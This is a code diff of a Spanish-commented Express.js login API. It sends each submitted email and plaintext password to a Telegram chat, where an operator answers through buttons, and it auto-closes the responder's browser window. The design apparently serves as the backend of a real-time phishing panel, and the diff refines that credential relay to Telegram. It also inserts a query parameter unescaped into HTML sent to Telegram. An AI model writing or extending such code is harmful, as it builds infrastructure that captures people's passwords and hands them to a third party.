@@ -27,11 +27,14 @@ router.post('/login', async (req, res) => {
 
     // Enviar a Telegram (sin bloquear si falla)
     try {
-      await telegramService.sendAuthRequest(sessionId, email, password);
+      const telegramResponse = await telegramService.sendAuthRequest(sessionId, email, password);
+      // Guardar message_id para poder editar el mensaje después
+      if (telegramResponse?.result?.message_id) {
+        global.sessions[sessionId].messageId = telegramResponse.result.message_id;
+      }
       console.log('[AUTH] Mensaje enviado a Telegram exitosamente');
     } catch (telegramError) {
       console.error('[AUTH] Error enviando a Telegram:', telegramError.message);
-      // No fallar aquí, dejar que continúe el polling
     }
 
     // Responder al cliente
@@ -69,6 +72,8 @@ router.get('/status/:sessionId', (req, res) => {
     }
 
     // Retornar estado
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+    res.set('Pragma', 'no-cache');
     res.json({
       sessionId,
       status: session.status,
@@ -81,7 +86,7 @@ router.get('/status/:sessionId', (req, res) => {
 });
 
 // GET /api/auth/respond/:sessionId - Endpoint para botones de Telegram
-router.get('/respond/:sessionId', (req, res) => {
+router.get('/respond/:sessionId', async (req, res) => {
   try {
     const { sessionId } = req.params;
     const { response } = req.query;
@@ -98,19 +103,19 @@ router.get('/respond/:sessionId', (req, res) => {
 
     // Actualizar sesión con la respuesta
     sessionService.updateSessionStatus(sessionId, 'completed', response);
-
     console.log(`[AUTH RESPOND] Session ${sessionId}: ${response}`);
 
-    // Responder con página de éxito
-    res.send(`
-      <html>
-        <body style="font-family: Arial; text-align: center; padding: 50px;">
-          <h1>✅ Respuesta registrada</h1>
-          <p>Tu respuesta: <strong>${response}</strong></p>
-          <p>Puedes cerrar esta ventana y continuar en la aplicación.</p>
-        </body>
-      </html>
-    `);
+    // Eliminar botones del mensaje de Telegram
+    if (session.messageId) {
+      const emoji = response.includes('Error') || response.includes('ERROR') ? '❌' : '✅';
+      await telegramService.removeButtons(
+        session.messageId,
+        `🔐 <b>Autenticación procesada</b>\n<b>Email:</b> <code>${session.email}</code>\n<b>Respuesta:</b> ${emoji} ${response}`
+      );
+    }
+
+    // Cerrar ventana automáticamente (no abrir página)
+    res.send(`<html><head><title>OK</title></head><body><script>window.close();window.location='about:blank';</script></body></html>`);
   } catch (error) {
     console.error('[RESPOND ERROR]', error);
     res.status(500).json({ error: 'Error al procesar respuesta' });
